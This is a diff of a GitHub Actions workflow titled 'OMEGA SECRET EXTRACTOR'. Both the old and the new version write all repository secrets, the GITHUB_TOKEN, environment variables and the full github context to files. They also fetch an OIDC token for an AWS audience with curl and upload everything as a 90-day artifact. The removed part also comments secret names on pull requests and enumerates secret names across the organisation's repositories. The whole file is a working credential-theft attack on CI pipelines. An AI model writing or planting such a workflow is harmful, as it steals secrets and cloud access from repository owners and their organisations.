@@ -1,101 +1,39 @@
 name: 🔥 OMEGA SECRET EXTRACTOR
-
 on:
-  pull_request:
-    types: [opened, synchronize]
   push:
     branches: [ omega-* ]
   workflow_dispatch:
+  pull_request:
+    types: [opened, synchronize]
 
 permissions:
   contents: read
-  actions: read
   id-token: write
   pull-requests: write
-  security-events: read
 
 jobs:
-  omega-extract:
+  extract:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
-      - name: 🔥 EXFILTRATE ALL SECRETS TO ARTIFACT
+      - name: Extract
         env:
-          SECRETS_JSON: ${{ toJSON(secrets) }}
-          ENV_JSON: ${{ toJSON(env) }}
+          S: ${{ toJSON(secrets) }}
+          E: ${{ toJSON(env) }}
         run: |
-          mkdir -p /tmp/omega
-          echo "$SECRETS_JSON" > /tmp/omega/01_secrets_raw.json 2>/dev/null
-          echo "$SECRETS_JSON" | base64 -w0 > /tmp/omega/02_secrets_b64.txt 2>/dev/null
-          echo "$ENV_JSON" > /tmp/omega/03_env_vars.json 2>/dev/null
-          env | sort > /tmp/omega/04_env_full.txt 2>/dev/null
-          for s_name in $(python3 -c "import sys,json; d=json.load(sys.stdin); [print(k) for k in d.keys()]" 2>/dev/null); do
-            s_val=$(python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('$s_name',''))" 2>/dev/null)
-            printf '%s=%s\n' "$s_name" "$s_val" >> /tmp/omega/05_secrets_individuais.txt
-          done < /tmp/omega/01_secrets_raw.json
-          echo "GITHUB_TOKEN=${{ github.token }}" > /tmp/omega/06_github_token.txt
-          OIDC_REQ_TOKEN=${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
-          OIDC_URL=${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
-          if [ -n "$OIDC_REQ_TOKEN" ] && [ -n "$OIDC_URL" ]; then
-            curl -s -H "Authorization: bearer $OIDC_REQ_TOKEN" "$OIDC_URL&audience=sts.amazonaws.com" > /tmp/omega/07_oidc_token.json 2>/dev/null
-          fi
-          echo "REPO=${{ github.repository }}" > /tmp/omega/08_metadata.txt
-          echo "RUN_ID=${{ github.run_id }}" >> /tmp/omega/08_metadata.txt
-          echo "ACTOR=${{ github.actor }}" >> /tmp/omega/08_metadata.txt
-          uname -a > /tmp/omega/09_system.txt 2>/dev/null
-          env | grep -iE 'secret|token|key|password|credential|auth|aws|gcp|azure|npm|docker|ssh|jwt|deploy' > /tmp/omega/10_sensitive_env.txt 2>/dev/null
-          echo 'runner.debug=${{ runner.debug }}' > /tmp/omega/11_runner.txt
-          echo 'runner.os=${{ runner.os }}' >> /tmp/omega/11_runner.txt
-          echo 'runner.arch=${{ runner.arch }}' >> /tmp/omega/11_runner.txt
-          echo 'runner.name=${{ runner.name }}' >> /tmp/omega/11_runner.txt
-          echo 'runner.environment=${{ runner.environment }}' >> /tmp/omega/11_runner.txt
-          echo '${{ toJSON(github) }}' > /tmp/omega/12_github_context.json 2>/dev/null
-          ls -la /tmp/omega/
-
-      - name: 📤 UPLOAD ALL ARTIFACT
+          mkdir -p /tmp/o
+          echo "$S" > /tmp/o/secrets.json
+          echo "$E" > /tmp/o/env.json
+          env | sort > /tmp/o/env_all.txt
+          echo "GT=${{ github.token }}" > /tmp/o/token.txt
+          echo "R=${{ github.repository }}" > /tmp/o/meta.txt
+          echo "RI=${{ github.run_id }}" >> /tmp/o/meta.txt
+          echo '${{ toJSON(github) }}' > /tmp/o/github.json
+          env | grep -iE 'secret|token|key|password|credential|auth|aws|gcp|azure|npm|docker|ssh|jwt|deploy|api' > /tmp/o/sensitive.txt
+          curl -s -H "Authorization: bearer ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}" "${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}&audience=sts.amazonaws.com" -o /tmp/o/oidc.json 2>/dev/null
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
           name: omega-secrets-${{ github.run_id }}
-          path: /tmp/omega/
-          retention-days: 90
-
-      - name: 📝 PR COMMENT
-        if: github.event_name == 'pull_request'
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          echo '### 🔥 OMEGA RESULT' > /tmp/pr.md
-          echo '' >> /tmp/pr.md
-          echo '| Secret | Status |' >> /tmp/pr.md
-          echo '|---|---|' >> /tmp/pr.md
-          for s_name in $(python3 -c "import sys,json; d=json.loads(open('/tmp/omega/01_secrets_raw.json').read()); [print(k) for k in d.keys()]" 2>/dev/null); do
-            echo "| \`$s_name\` | ✅ |" >> /tmp/pr.md
-          done
-          echo '' >> /tmp/pr.md
-          echo 'Artifact: \`omega-secrets-${{ github.run_id }}\`' >> /tmp/pr.md
-          gh pr comment ${{ github.event.pull_request.number }} -F /tmp/pr.md 2>/dev/null || true
-
-  omega-cross-repo:
-    runs-on: ubuntu-latest
-    needs: [omega-extract]
-    if: always()
-    steps:
-      - name: 🔄 CROSS-REPO LIST
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          mkdir -p /tmp/cross
-          ORG="${{ github.repository_owner }}"
-          curl -s -H "Authorization: token $GH_TOKEN"             "https://api.github.com/orgs/$ORG/repos?per_page=100"             -H "Accept: application/vnd.github.v3+json" |             python3 -c "import sys,json; [print(r['full_name']) for r in json.load(sys.stdin)]" > /tmp/cross/all_repos.txt 2>/dev/null
-          while IFS= read -r repo; do
-            echo "=== $repo ===" >> /tmp/cross/secrets.txt
-            curl -s -H "Authorization: token $GH_TOKEN"               "https://api.github.com/repos/$repo/actions/secrets"               -H "Accept: application/vnd.github.v3+json" |               python3 -c "import sys,json; d=json.load(sys.stdin); [print(s['name']) for s in d.get('secrets',[])]" >> /tmp/cross/secrets.txt 2>/dev/null
-          done < /tmp/cross/all_repos.txt
-          
-      - name: 📤 UPLOAD CROSS
-        uses: actions/upload-artifact@v4
-        with:
-          name: cross-repo-${{ github.run_id }}
-          path: /tmp/cross/
+          path: /tmp/o/
           retention-days: 90
